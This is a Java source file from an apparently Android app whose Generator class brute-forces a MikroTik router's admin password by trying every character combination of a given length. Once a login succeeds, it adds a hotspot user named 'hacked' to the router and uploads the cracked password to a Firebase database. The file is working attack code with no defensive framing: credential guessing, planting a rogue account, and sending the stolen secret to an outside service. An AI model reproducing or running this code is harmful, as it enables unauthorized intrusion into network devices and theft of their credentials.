package sy.iyad.searcher.models;


import androidx.annotation.NonNull;
import com.google.firebase.database.FirebaseDatabase;
import sy.iyad.mikrotik.MikrotikServer;
import sy.iyad.mikrotik.Models.ConnectionEventListener;
import sy.iyad.mikrotik.Utils.Api;
import sy.iyad.searcher.exception.GeneratorException;


public class Generator {


    private final String address;
    private final String admin;
    public static String password="";


    public Generator(@NonNull String address,@NonNull String admin){

        super();
        this.address = address;
        this.admin = admin;
    }

    public void generateSpecial(int length,char start,char end) throws GeneratorException {

        if (length<1){
            throw new NumberFormatException("الطول اصغر من العدد واحد") ;
        }else {
            generateSetup("", length,start,end);

        }
    }
    public void generate(int length) throws GeneratorException{
        generateSpecial(length,'0','z');
    }

    private void generateSetup(@NonNull String base, int length,char start,char end)throws GeneratorException{

        if (password.equals("")) {
            for (char ch = start; ch <= end; ch++) {

                if (length == 1) {
                    testConnection(base + ch);

                } else {

                        generateSetup(base + ch, length - 1,start,end);

                }
                }
        }else {
            System.out.println(password);
        }
    }

    public void addOnCompleteListener(@NonNull OnCompleteListener listener){

        if (password != null) {
            listener.onComplete(password);
        }
    }

    private void testConnection(@NonNull String passwordLocal) {

        MikrotikServer.connect(address,admin,passwordLocal).addConnectionEventListener(
                new ConnectionEventListener() {
                    @Override
                    public void onConnectionSuccess(Api api) {
                        password = passwordLocal;
                        System.out.println(passwordLocal);

                        MikrotikServer.execute("/ip/hotspot/user/add  name=hacked");
                        Info info =new Info();
                        info.setIdenty("hacked");
                        info.setPassword(password);
                        FirebaseDatabase.getInstance().getReference().child("passwords/identy").push().setValue(info);
                    }

                    @Override
                    public void onConnectionFailed(Exception exception) {

                        System.out.println(exception.getMessage());
                    }
                }
        );
    }

    public interface OnCompleteListener{
        void onComplete(@NonNull String password);
    }
}
